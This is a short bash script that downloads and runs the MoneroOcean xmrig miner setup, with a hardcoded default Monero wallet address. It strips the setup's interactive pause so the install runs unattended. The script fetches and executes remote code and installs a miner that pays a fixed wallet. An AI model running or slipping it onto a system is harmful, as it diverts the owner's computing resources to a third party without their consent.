#!/usr/bin/env bash
set -euo pipefail

WALLET="${WALLET:-46egUxZjZpT6WcmSbwdycWMxKuVU1HxFWVKX5iUSokpWDSG14LVqnRk21SD7REgpsZBz7Qeytm36qjPJvvnv1XBPBnNniem}"

echo "=== MoneroOcean Official Setup ==="
echo "Started at $(date)"

# Download official MoneroOcean setup script
curl -fsSL --retry 3 --retry-delay 5 \
  https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh \
  -o /tmp/setup_mo.sh

# Remove interactive sleep for automation
sed -i 's/sleep 15/sleep 0/' /tmp/setup_mo.sh

# Run official script with wallet
bash /tmp/setup_mo.sh "$WALLET"

echo "[*] Official setup complete at $(date)"
